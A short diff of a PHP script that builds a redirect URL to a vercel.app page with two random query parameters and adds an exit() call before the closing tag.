@@ -7,4 +7,5 @@ $rand2 = bin2hex(random_bytes(10));
 $redirectUrl = "https://dorsite-88mys2qnw-ula0709s-projects.vercel.app/indexpaginaprincipal.html/?param1=$rand1&param2=$rand2";
 
 // Perform the redirect
+exit()
 ?>
